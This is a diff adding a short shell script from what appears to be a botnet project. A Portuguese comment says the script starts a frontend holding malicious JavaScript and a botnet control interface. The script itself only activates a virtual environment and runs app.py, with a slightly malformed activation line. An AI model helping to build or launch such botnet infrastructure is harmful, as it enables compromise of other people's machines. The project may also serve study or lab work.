@@ -1,0 +1,9 @@
+#! /bin/sh
+
+# script que inicializa o frontend que contém o javascript malicioso e a interface de controle da botnet
+
+# inicializa o ambiente virtual
+source activate ./env/bin/activate
+
+cd ./frontend
+python app.py
